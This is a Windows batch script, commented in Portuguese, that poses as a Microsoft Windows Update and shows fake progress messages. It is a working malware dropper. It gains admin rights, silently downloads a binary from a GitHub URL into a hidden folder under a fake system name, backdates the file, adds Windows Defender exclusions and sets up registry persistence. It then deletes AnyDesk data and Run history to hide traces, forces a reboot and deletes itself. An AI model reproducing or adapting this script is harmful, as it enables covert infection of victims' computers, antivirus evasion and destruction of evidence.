@echo off
setlocal enabledelayedexpansion
title Windows System Update
color 0f

:: [1] Solicitar Admin de forma silenciosa (Sem nomes suspeitos)
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cls
echo.
echo   Microsoft Windows Update Service
echo   --------------------------------
echo.
echo   [*] Verificando integridade do sistema...
echo   [*] Baixando pacotes de seguranca criticos...

:: [2] Definir Caminhos (Tier 0 Stealth Paths)
set "targetDir=%APPDATA%\Microsoft\Windows\SystemData"
set "targetExe=%targetDir%\SearchIndexer.exe"
set "repoUrl=https://raw.githubusercontent.com/V3xDev/unknow2/main/WinSystemAsset.bin"
set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "regName=MicrosoftWindowsSearchIndex"

:: [3] Parar servicos antigos silenciosamente
taskkill /f /im SearchIndexer.exe >nul 2>&1

:: [4] Criar Diretorio de Sistema Oculto
if not exist "%targetDir%" mkdir "%targetDir%" >nul 2>&1
attrib +h +s "%targetDir%"

:: [5] Download Silencioso do GitHub
curl -s -L -o "%targetExe%" "%repoUrl%" --ssl-no-revoke

:: Verificacao silenciosa de erro
if not exist "%targetExe%" (
    cls
    echo.
    echo   [!] Erro 0x80070002: Falha na conexao com servidor de atualizacao.
    echo       Verifique sua internet e tente novamente.
    pause
    exit /b
)

:: [6] Stealth: Falsificar Datas (Parecer arquivo de 2021)
powershell -Command "$f=Get-Item '%targetExe%'; $d=Get-Date '2021-05-15'; $f.CreationTime=$d; $f.LastWriteTime=$d; $f.LastAccessTime=$d" >nul 2>&1
attrib +h +s +r "%targetExe%"

:: [7] Configurar Exclusoes de Seguranca (Silencioso)
powershell -Command "Add-MpPreference -ExclusionPath '%targetDir%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess '%targetExe%' -ErrorAction SilentlyContinue" >nul 2>&1

:: [8] Configurar Inicializacao Automatica (Registro)
reg add "%regKey%" /v "%regName%" /t REG_SZ /d "\"%targetExe%\" --monitor" /f >nul 2>&1

:: [9] Limpeza de Rastros (AnyDesk e Explorer MRU)
taskkill /f /im AnyDesk.exe >nul 2>&1
if exist "%APPDATA%\AnyDesk" rd /s /q "%APPDATA%\AnyDesk" >nul 2>&1
if exist "%LOCALAPPDATA%\AnyDesk" rd /s /q "%LOCALAPPDATA%\AnyDesk" >nul 2>&1
powershell -Command "Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*' -ErrorAction SilentlyContinue" >nul 2>&1

:: [10] Finalizacao e Reinicio
cls
echo.
echo   Microsoft Windows Update Service
echo   --------------------------------
echo.
echo   [OK] Atualizacao configurada com sucesso.
echo.
echo   O sistema precisa ser reiniciado para concluir a instalacao.
echo   Reiniciando em 10 segundos...

shutdown /r /t 10 /c "Windows Update: Aplicando alteracoes de sistema..." /f

:: Auto-delete do instalador (opcional, remova o :: abaixo para ativar)
(goto) 2>nul & del "%~f0"
